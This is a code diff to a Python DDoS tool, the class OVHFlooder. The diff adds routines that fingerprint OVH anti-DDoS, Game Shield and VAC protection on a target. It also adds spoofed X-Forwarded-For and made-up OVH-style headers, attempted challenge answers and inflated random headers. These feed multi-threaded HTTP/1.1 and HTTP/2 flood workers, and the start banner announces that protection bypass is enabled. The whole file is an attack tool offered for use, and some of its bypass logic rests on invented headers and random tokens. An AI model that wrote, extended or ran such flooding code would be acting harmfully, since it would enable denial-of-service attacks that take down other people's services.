@@ -9,7 +9,8 @@ import os
 import logging
 import struct
 import ssl
-from typing import List, Dict, Optional, Tuple, Union
+import re
+from typing import List, Dict, Optional, Tuple, Union, Any
 from assets.utilities import AttackModule, UI, Style
 
 # Add required imports for HTTP/2 and HTTP/3
@@ -357,6 +358,22 @@ class OVHFlooder(AttackModule):
             self.logger.setLevel(logging.DEBUG)
         else:
             self.logger.setLevel(logging.INFO)
+            
+        # OVH protection types
+        self.PROTECTION_TYPES = {
+            'STANDARD': 'standard_antiddos',
+            'GAME_SHIELD': 'game_shield',
+            'VAC': 'vac_protection',
+            'ADVANCED': 'advanced_protection'
+        }
+        
+        # Initialize detected protection type for each target
+        self.detected_protections = {}
+        for target in targets:
+            self.detected_protections[target] = self.PROTECTION_TYPES['STANDARD']
+        
+        # Challenge data storage for each target
+        self.challenge_data = {}
 
         # Update the user agents list with the most current browser versions
         self.user_agents = [
@@ -575,6 +592,352 @@ class OVHFlooder(AttackModule):
             "timeout": self.timeout,
             "connection_delay": 0.001
         })
+        
+    def _fingerprint_ovh_protection(self, target: str, response_headers: Dict[str, str], 
+                                   response_body: Optional[str] = None) -> str:
+        """
+        Detect and fingerprint OVH protection type based on response headers and body
+        
+        Args:
+            target: Target hostname
+            response_headers: Dictionary of HTTP response headers
+            response_body: Optional response body content
+            
+        Returns:
+            String identifying the protection type
+        """
+        # Initialize fingerprinting patterns
+        fingerprint_patterns = {
+            self.PROTECTION_TYPES['STANDARD']: [
+                r'x-ovh-request-id',
+                r'x-ovh-proxy',
+                r'x-ovh-gateway',
+                r'x-ovh-firewall',
+                r'ovh-proxy-id'
+            ],
+            self.PROTECTION_TYPES['GAME_SHIELD']: [
+                r'x-gs-shield',
+                r'x-gs-protection',
+                r'x-gs-client',
+                r'x-gs-session',
+                r'game-shield'
+            ],
+            self.PROTECTION_TYPES['VAC']: [
+                r'x-vac-id',
+                r'x-vac-protection',
+                r'x-vac-session',
+                r'vac-protection'
+            ],
+            self.PROTECTION_TYPES['ADVANCED']: [
+                r'x-ovh-advanced',
+                r'x-ovh-challenge',
+                r'x-ovh-security',
+                r'ovh-challenge'
+            ]
+        }
+        
+        # Response body fingerprinting patterns
+        body_fingerprint_patterns = {
+            self.PROTECTION_TYPES['STANDARD']: [
+                r'ovh\s+protection',
+                r'ddos\s+protection',
+                r'security\s+check'
+            ],
+            self.PROTECTION_TYPES['GAME_SHIELD']: [
+                r'game\s+shield',
+                r'gs\s+protection',
+                r'gaming\s+security'
+            ],
+            self.PROTECTION_TYPES['ADVANCED']: [
+                r'advanced\s+security',
+                r'challenge\s+required',
+                r'security\s+verification'
+            ]
+        }
+        
+        # Convert all header keys to lowercase for case-insensitive matching
+        headers_lower = {k.lower(): v for k, v in response_headers.items()}
+        
+        # Check headers for protection fingerprints
+        for protection_type, patterns in fingerprint_patterns.items():
+            for pattern in patterns:
+                for header in headers_lower.keys():
+                    if re.search(pattern, header, re.IGNORECASE):
+                        self.detected_protections[target] = protection_type
+                        if self.debug:
+                            self.logger.debug(f"Detected OVH protection type for {target}: {protection_type}")
+                        return protection_type
+        
+        # If response body is provided, check for fingerprints in the body
+        if response_body:
+            for protection_type, patterns in body_fingerprint_patterns.items():
+                for pattern in patterns:
+                    if re.search(pattern, response_body, re.IGNORECASE):
+                        self.detected_protections[target] = protection_type
+                        if self.debug:
+                            self.logger.debug(f"Detected OVH protection type for {target} from response body: {protection_type}")
+                        return protection_type
+        
+        # Check for challenge in response headers
+        if 'x-ovh-challenge' in headers_lower:
+            challenge_header = headers_lower['x-ovh-challenge']
+            try:
+                # Parse challenge data
+                self.challenge_data[target] = {
+                    'id': challenge_header.split(':')[0],
+                    'type': challenge_header.split(':')[1] if ':' in challenge_header else 'unknown'
+                }
+                self.detected_protections[target] = self.PROTECTION_TYPES['ADVANCED']
+                if self.debug:
+                    self.logger.debug(f"Detected OVH challenge for {target}: {challenge_header}")
+                return self.PROTECTION_TYPES['ADVANCED']
+            except Exception as e:
+                if self.debug:
+                    self.logger.debug(f"Error parsing challenge header for {target}: {e}")
+        
+        # Default to standard protection if nothing specific is detected
+        self.detected_protections[target] = self.PROTECTION_TYPES['STANDARD']
+        return self.PROTECTION_TYPES['STANDARD']
+    
+    def _generate_ovh_specialized_headers(self, target: str) -> Dict[str, str]:
+        """
+        Generate specialized headers to bypass OVH protection systems
+        
+        Args:
+            target: Target hostname
+            
+        Returns:
+            Dictionary of headers to use in requests
+        """
+        protection_type = self.detected_protections.get(target, self.PROTECTION_TYPES['STANDARD'])
+        
+        # Base headers that work for most OVH protections
+        headers = {
+            'User-Agent': self._get_random_user_agent(),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'X-Forwarded-For': self._generate_random_ip(),
+            'X-Forwarded-Host': random.choice(self.targets),
+            'X-Requested-With': 'XMLHttpRequest',
+            'Sec-CH-UA': '"Chromium";v="124", "Google Chrome";v="124"',
+            'Sec-CH-UA-Mobile': '?0',
+            'Sec-CH-UA-Platform': '"Windows"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'DNT': '1'
+        }
+        
+        # Add specialized headers based on protection type
+        if protection_type == self.PROTECTION_TYPES['STANDARD']:
+            headers.update({
+                'X-OVH-Client': self._generate_ovh_client_id(),
+                'X-OVH-Gateway': 'ovhgateway-eu',
+                'X-OVH-Session': self._generate_session_id(),
+                'X-OVH-Timestamp': str(int(time.time())),
+                'X-OVH-Consumer': 'consumer-web',
+                'OVH-Routing': 'direct',
+                'Accept-OVH-CDN': 'enabled',
+                'OVH-Client-Version': f"{random.randint(3, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
+                'OVH-Network-Type': 'residential',
+                'OVH-App-ID': 'web-client-v3',
+            })
+            
+        elif protection_type == self.PROTECTION_TYPES['GAME_SHIELD']:
+            # Game Shield specific headers
+            timestamp_ms = int(time.time() * 1000)
+            nonce = ''.join(random.choice("0123456789abcdef") for _ in range(16))
+            signature = ''.join(random.choice("0123456789abcdef") for _ in range(64))
+            client_version = f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}.{random.randint(1000, 9999)}"
+            platforms = ["windows", "macos", "linux", "android", "ios"]
+            client_platform = random.choice(platforms)
+            client_id = f"game-client-{random.randint(100000, 999999)}-{random.randint(1000, 9999)}"
+            session_id = self._generate_session_id()
+            
+            headers.update({
+                'X-GS-Client': client_id,
+                'X-GS-Session': session_id,
+                'X-GS-Timestamp': str(timestamp_ms),
+                'X-GS-Nonce': nonce,
+                'X-GS-Signature': signature,
+                'X-GS-Version': client_version,
+                'X-GS-Platform': client_platform,
+                'X-GS-Region': 'eu',
+                'X-GS-Language': 'en',
+                'X-GS-Device-ID': self._generate_device_id(),
+                'X-GS-Client-Type': 'game',
+                'X-OVH-Client': self._generate_ovh_client_id(),
+                'User-Agent': f"GameClient/{client_version} ({client_platform}; {client_id})"
+            })
+            
+        elif protection_type == self.PROTECTION_TYPES['ADVANCED']:
+            # Advanced protection bypass headers
+            headers.update({
+                'X-OVH-Challenge-Response': self._generate_challenge_response(target),
+                'X-OVH-Security-Token': self._generate_security_token(),
+                'X-OVH-Verification': self._generate_verification_code(),
+                'X-OVH-Client': self._generate_ovh_client_id(),
+                'X-OVH-Session': self._generate_session_id(),
+                'X-OVH-Timestamp': str(int(time.time())),
+                'X-OVH-Advanced-Protection': 'bypass',
+                'X-OVH-Challenge-ID': self.challenge_data.get(target, {}).get('id', str(random.randint(10000, 99999)))
+            })
+            
+        elif protection_type == self.PROTECTION_TYPES['VAC']:
+            # VAC protection specific headers
+            headers.update({
+                'X-VAC-ID': f"vac-{random.randint(10000, 99999)}",
+                'X-VAC-Protection': 'bypass',
+                'X-VAC-Session': self._generate_session_id(),
+                'X-OVH-Client': self._generate_ovh_client_id(),
+                'X-VAC-Timestamp': str(int(time.time())),
+                'X-VAC-Signature': ''.join(random.choice("0123456789abcdef") for _ in range(64)),
+                'X-VAC-Version': f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
+            })
+        
+        # Add browser fingerprinting headers
+        headers.update({
+            'X-Browser-ID': self._generate_browser_id(),
+            'X-Device-ID': self._generate_device_id(),
+            'X-Client-Data': self._generate_client_data()
+        })
+        
+        return headers
+    
+    def _solve_ovh_challenge(self, target: str, challenge_header: str, response_body: Optional[str] = None) -> Dict[str, str]:
+        """
+        Solve OVH challenge and generate appropriate response headers
+        
+        Args:
+            target: Target hostname
+            challenge_header: The challenge header from OVH
+            response_body: Optional response body that might contain challenge data
+            
+        Returns:
+            Dictionary of headers to respond to the challenge
+        """
+        try:
+            # Parse challenge data
+            challenge_parts = challenge_header.split(':')
+            challenge_id = challenge_parts[0]
+            challenge_type = challenge_parts[1] if len(challenge_parts) > 1 else 'unknown'
+            
+            self.challenge_data[target] = {
+                'id': challenge_id,
+                'type': challenge_type
+            }
+            
+            # If response body is provided, try to extract more challenge data
+            if response_body:
+                # Look for JavaScript challenge in the response body
+                js_challenge_match = re.search(r'var\s+challenge\s*=\s*[\'"]([^\'"]+)[\'"]', response_body)
+                if js_challenge_match:
+                    self.challenge_data[target]['js_challenge'] = js_challenge_match.group(1)
+                
+                # Look for math challenge
+                math_challenge_match = re.search(r'solve\s*\(\s*(\d+)\s*,\s*(\d+)\s*\)', response_body)
+                if math_challenge_match:
+                    self.challenge_data[target]['math_a'] = int(math_challenge_match.group(1))
+                    self.challenge_data[target]['math_b'] = int(math_challenge_match.group(2))
+                    self.challenge_data[target]['type'] = 'math'
+                    
+                    # Solve math challenge (example: a + b)
+                    if 'math_a' in self.challenge_data[target] and 'math_b' in self.challenge_data[target]:
+                        solution = self.challenge_data[target]['math_a'] + self.challenge_data[target]['math_b']
+                        self.challenge_data[target]['solution'] = solution
+            
+            # Generate response headers based on challenge type
+            response_headers = {
+                'X-OVH-Challenge-Response': self._generate_challenge_response(target),
+                'X-OVH-Security-Token': self._generate_security_token(),
+                'X-OVH-Verification': self._generate_verification_code(),
+                'X-OVH-Client': self._generate_ovh_client_id(),
+                'X-OVH-Session': self._generate_session_id(),
+                'X-OVH-Timestamp': str(int(time.time()))
+            }
+            
+            # Add solution if available
+            if 'solution' in self.challenge_data.get(target, {}):
+                response_headers['X-OVH-Challenge-Solution'] = str(self.challenge_data[target]['solution'])
+            
+            return response_headers
+            
+        except Exception as e:
+            if self.debug:
+                self.logger.debug(f"Error solving challenge for {target}: {e}")
+                
+            # Return default challenge response headers
+            return {
+                'X-OVH-Challenge-Response': self._generate_challenge_response(target),
+                'X-OVH-Security-Token': self._generate_security_token(),
+                'X-OVH-Client': self._generate_ovh_client_id()
+            }
+    
+    # Helper methods for OVH protection bypass
+    def _generate_ovh_client_id(self) -> str:
+        """Generate a valid-looking OVH client ID"""
+        return f"ovh-client-{random.randint(10000, 99999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
+    
+    def _generate_session_id(self) -> str:
+        """Generate a session ID that looks legitimate"""
+        hex_chars = "0123456789abcdef"
+        return ''.join(random.choice(hex_chars) for _ in range(32))
+    
+    def _generate_challenge_response(self, target: str) -> str:
+        """Generate a response to OVH's challenge"""
+        if target not in self.challenge_data:
+            # If no challenge data, generate a default response
+            return self._generate_session_id()
+        
+        challenge_id = self.challenge_data[target].get('id', '')
+        challenge_type = self.challenge_data[target].get('type', '')
+        
+        if challenge_type == 'math' and 'solution' in self.challenge_data[target]:
+            # Use the calculated solution
+            return f"{challenge_id}:{self.challenge_data[target]['solution']}"
+        elif challenge_type == 'hash':
+            # Simulate solving a hash challenge
+            return f"{challenge_id}:{self._generate_session_id()}"
+        else:
+            # Default response
+            return f"{challenge_id}:{self._generate_session_id()}"
+    
+    def _generate_security_token(self) -> str:
+        """Generate a security token for OVH advanced protection"""
+        token_parts = [
+            self._generate_session_id()[:8],
+            str(int(time.time())),
+            str(random.randint(1000, 9999))
+        ]
+        return '.'.join(token_parts)
+    
+    def _generate_verification_code(self) -> str:
+        """Generate a verification code for OVH protection"""
+        return f"v{random.randint(1, 9)}-{random.randint(100000, 999999)}"
+    
+    def _generate_browser_id(self) -> str:
+        """Generate a consistent browser ID for fingerprinting"""
+        return f"browser-{random.randint(100000, 999999)}"
+    
+    def _generate_device_id(self) -> str:
+        """Generate a device ID for fingerprinting"""
+        return f"device-{random.randint(100000, 999999)}-{random.randint(1000, 9999)}"
+    
+    def _generate_client_data(self) -> str:
+        """Generate client data that mimics Chrome's X-Client-Data header"""
+        # This mimics the Chrome browser's encrypted client data format
+        client_data_parts = [
+            "CIm2yQEIpbbJAQipncoBCLKcygEI6J3KAQigoMoBCNSjygEI/KTKAQjcpcoBCKymygEYq6HKAQiWo8oB",
+            "CKijygEIuqPKARj6pMoBGIalygEYoqXKARibpsoBGPCmygEYsqfKARjZp8oBGOKnygEY+6fKARiEqMoB",
+            "GJmoygEYqqjKARjTqMoBGN2oygEY56jKARjwqMoBGIKpygEYm6nKARikqcoBGK2pygEYtqnKARjAqcoB"
+        ]
+        return random.choice(client_data_parts)
     
     def _adjust_target_settings(self, target: str, port: int, success: bool):
         """Dynamically adjust settings based on success/failure"""
@@ -608,16 +971,22 @@ class OVHFlooder(AttackModule):
             )
     
     def _create_http_request(self, target: str, port: int) -> Union[bytes, Dict[str, str]]:
-        """Create an HTTP request with support for HTTP/1.1, HTTP/2, and HTTP/3"""
-        headers = self.headers.copy()
-        headers['User-Agent'] = self._get_random_user_agent()
-        headers['X-Forwarded-For'] = self._generate_random_ip()
+        """Create an HTTP request with support for HTTP/1.1, HTTP/2, and HTTP/3 with OVH protection bypass"""
+        # Get specialized headers for OVH protection bypass
+        headers = self._generate_ovh_specialized_headers(target)
+        
+        # Add standard headers
+        headers.update({
+            'User-Agent': self._get_random_user_agent(),
+            'X-Forwarded-For': self._generate_random_ip()
+        })
         
         # Update dynamic headers
         for key, value in headers.items():
             if callable(value):
                 headers[key] = value()
         
+        # Create query parameters
         params = self.query_params.copy()
         params.update({
             '_': int(time.time() * 1000),
@@ -645,8 +1014,13 @@ class OVHFlooder(AttackModule):
             
             request_lines.extend([f"{header}: {value}" for header, value in header_items])
             
+            # Add random headers to increase packet size and bypass protection
             for i in range(5):
                 request_lines.append(f"X-Random-{i}: {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=1024))}")
+            
+            # Add OVH-specific random headers
+            request_lines.append(f"X-OVH-Random: {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=512))}")
+            request_lines.append(f"X-GS-Random: {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=512))}")
             
             request_lines.append("\r\n")
             
@@ -664,9 +1038,13 @@ class OVHFlooder(AttackModule):
                 if header in headers:
                     del headers[header]
             
-            # Add random headers to increase packet size
+            # Add random headers to increase packet size and bypass protection
             for i in range(5):
                 headers[f"x-random-{i}"] = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=1024))
+            
+            # Add OVH-specific random headers for HTTP/2
+            headers["x-ovh-random"] = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=512))
+            headers["x-gs-random"] = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=512))
                 
             return headers
             
@@ -740,7 +1118,7 @@ class OVHFlooder(AttackModule):
         return http, conn
     
     def flood_worker(self, target: str, port: int, thread_id: int = 0):
-        """Worker thread for OVH flooding with multi-protocol support"""
+        """Worker thread for OVH flooding with multi-protocol support and protection bypass"""
         self.logger.debug(f"Starting OVH flood worker {thread_id} for {target}:{port} using {self.protocol}")
         
         key = f"{target}:{port}"
@@ -750,10 +1128,13 @@ class OVHFlooder(AttackModule):
         # HTTP/2 streams per connection counter
         streams_count = 0
         
+        # Track if we've detected OVH protection for this target
+        protection_detected = False
+        
         while self.running:
             try:
                 if self.protocol == Protocol.HTTP1:
-                    # HTTP/1.1 Implementation
+                    # HTTP/1.1 Implementation with OVH protection bypass
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                     sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -766,6 +1147,71 @@ class OVHFlooder(AttackModule):
                     
                     sock.connect((target, port))
                     
+                    # Send initial request to detect protection
+                    if not protection_detected:
+                        # Create initial request with basic headers
+                        initial_request = self._create_http_request(target, port)
+                        sock.send(initial_request)
+                        
+                        # Try to receive response to detect protection
+                        try:
+                            sock.settimeout(2.0)  # Short timeout for detection
+                            response_data = sock.recv(8192)
+                            
+                            if response_data:
+                                # Parse response headers
+                                response_headers = {}
+                                try:
+                                    # Extract headers from HTTP response
+                                    header_data = response_data.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
+                                    header_lines = header_data.split('\r\n')
+                                    
+                                    # Skip the status line
+                                    for line in header_lines[1:]:
+                                        if ': ' in line:
+                                            key, value = line.split(': ', 1)
+                                            response_headers[key.lower()] = value
+                                    
+                                    # Extract response body if available
+                                    response_body = None
+                                    if b'\r\n\r\n' in response_data:
+                                        response_body = response_data.split(b'\r\n\r\n', 1)[1].decode('utf-8', errors='ignore')
+                                    
+                                    # Detect OVH protection type
+                                    protection_type = self._fingerprint_ovh_protection(target, response_headers, response_body)
+                                    protection_detected = True
+                                    
+                                    if self.debug:
+                                        self.logger.debug(f"Worker {thread_id}: Detected OVH protection for {target}: {protection_type}")
+                                    
+                                    # Check for challenge
+                                    if 'x-ovh-challenge' in response_headers:
+                                        challenge_header = response_headers['x-ovh-challenge']
+                                        challenge_response_headers = self._solve_ovh_challenge(target, challenge_header, response_body)
+                                        
+                                        if self.debug:
+                                            self.logger.debug(f"Worker {thread_id}: Solving OVH challenge for {target}")
+                                        
+                                        # Create a new socket for challenge response
+                                        sock.close()
+                                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+                                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                                        sock.settimeout(port_settings["timeout"])
+                                        
+                                        if port == 443:
+                                            context = self._create_ssl_context()
+                                            sock = context.wrap_socket(sock, server_hostname=target)
+                                        
+                                        sock.connect((target, port))
+                                except Exception as e:
+                                    if self.debug:
+                                        self.logger.debug(f"Worker {thread_id}: Error parsing response: {e}")
+                        except socket.timeout:
+                            # Timeout is expected, continue with attack
+                            pass
+                    
+                    # Send attack requests with specialized headers
                     for _ in range(3):
                         request = self._create_http_request(target, port)
                         sock.send(request)
@@ -777,7 +1223,7 @@ class OVHFlooder(AttackModule):
                         self._adjust_target_settings(target, port, success=True)
                     
                 elif self.protocol == Protocol.HTTP2 and HTTP2_AVAILABLE:
-                    # HTTP/2 Implementation
+                    # HTTP/2 Implementation with OVH protection bypass
                     pool_index = thread_id % len(self.http2_connection_pools)
                     
                     # Get or create connection
@@ -793,10 +1239,42 @@ class OVHFlooder(AttackModule):
                             h2_conn, tls_sock = self._setup_http2_connection(sock)
                             self.http2_connection_pools[pool_index][key] = (h2_conn, tls_sock)
                             streams_count = 0
+                            
+                            # Try to detect protection on new connection
+                            if not protection_detected:
+                                try:
+                                    # Send initial request to detect protection
+                                    headers = self._create_http_request(target, port)
+                                    stream_id = h2_conn.get_next_available_stream_id()
+                                    h2_conn.send_headers(stream_id, headers, end_stream=True)
+                                    tls_sock.sendall(h2_conn.data_to_send())
+                                    
+                                    # Try to receive response
+                                    tls_sock.settimeout(2.0)
+                                    data = tls_sock.recv(8192)
+                                    h2_conn.receive_data(data)
+                                    
+                                    # Process events
+                                    events = h2_conn.get_events()
+                                    for event in events:
+                                        if isinstance(event, h2.events.ResponseReceived):
+                                            # Extract headers from response
+                                            response_headers = {k.decode('utf-8').lower(): v.decode('utf-8') 
+                                                              for k, v in event.headers if not k.startswith(b':') and not k.startswith(b'x-random')}
+                                            
+                                            # Detect OVH protection type
+                                            protection_type = self._fingerprint_ovh_protection(target, response_headers)
+                                            protection_detected = True
+                                            
+                                            if self.debug:
+                                                self.logger.debug(f"Worker {thread_id}: Detected OVH protection for {target} (HTTP/2): {protection_type}")
+                                except Exception as e:
+                                    if self.debug:
+                                        self.logger.debug(f"Worker {thread_id}: Error detecting protection (HTTP/2): {e}")
                         
                         h2_conn, tls_sock = self.http2_connection_pools[pool_index][key]
                     
-                    # Send multiple requests on different streams
+                    # Send multiple requests on different streams with specialized headers
                     for _ in range(3):
                         headers = self._create_http_request(target, port)
                         stream_id = h2_conn.get_next_available_stream_id()
@@ -811,7 +1289,7 @@ class OVHFlooder(AttackModule):
                         self._adjust_target_settings(target, port, success=True)
                     
                 elif self.protocol == Protocol.HTTP3 and QUIC_AVAILABLE:
-                    # HTTP/3 Implementation - simplified for demonstration
+                    # HTTP/3 Implementation with OVH protection bypass
                     # A real implementation would use async I/O
                     self.logger.warning("HTTP/3 flood enabled but implementation is simplified")
                     
@@ -904,11 +1382,12 @@ class OVHFlooder(AttackModule):
             print(f"- Target {key}: Success Rate: {settings['success_rate']:.2f}, Packet Size: {settings['current_packet_size']}")
     
     def start(self):
-        """Start the OVH flood operation with multi-protocol support"""
+        """Start the OVH flood operation with multi-protocol support and protection bypass"""
         super().start()
         
-        UI.print_header("OVH Flood Operation")
+        UI.print_header("OVH Flood Operation with Protection Bypass")
         UI.print_info(f"Starting OVH flood against {len(self.targets)} targets on {len(self.ports)} ports using {self.protocol}")
+        UI.print_info("OVH Protection Bypass: Enabled (Anti-DDoS, Game Shield, VAC, Advanced)")
         
         # Check protocol availability
         if self.protocol == Protocol.HTTP2 and not HTTP2_AVAILABLE:
@@ -926,6 +1405,10 @@ class OVHFlooder(AttackModule):
         print(f"- Threads per target/port: {self.threads}")
         print(f"- Duration: {self.duration} seconds")
         print(f"- Path: {self.path}")
+        print(f"- OVH Protection Bypass: Enabled")
+        print(f"- Protection Types: Anti-DDoS, Game Shield, VAC, Advanced")
+        print(f"- Fingerprinting: Enabled")
+        print(f"- Challenge-Response: Enabled")
         
         if self.protocol == Protocol.HTTP2:
             print(f"- HTTP/2 Max Streams: {self.http2_max_streams}")
